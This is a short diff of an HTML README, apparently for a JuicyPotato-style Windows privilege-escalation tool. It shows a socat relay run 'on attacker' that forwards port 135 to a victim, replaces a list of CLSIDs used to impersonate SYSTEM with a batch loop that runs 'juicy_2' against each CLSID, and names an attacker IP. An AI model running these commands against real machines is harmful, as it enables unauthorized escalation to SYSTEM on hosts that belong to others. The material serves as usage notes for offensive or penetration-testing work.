@@ -23,7 +23,13 @@ Example:<br>
   on attacker (192.168.1.1): <br>
   socat -v  TCP-LISTEN:135,fork,reuseaddr TCP:[victim machine]:9995<br>
 <hr>  
-If you want to impersonate SYSTEM use these CLSID's:<br>
-{C41B1461-3F8C-4666-B512-6DF24DE566D1}<br>
-{90F18417-F0F1-484E-9D3C-59DCEEE5DBD8}<br>
+<b>Hunting for juicy CLSID's</b><br>
+@echo off<br>
+FOR /F %%i IN (clsid.list) DO (<br>
+   .\juicy_2 -z -x 192.168.1.1 -n 9998 -l 9995 -c %%i >> .\out.txt<br>
+   timeout /t 2<br>
+ )<br>
+ 
+  
+
   
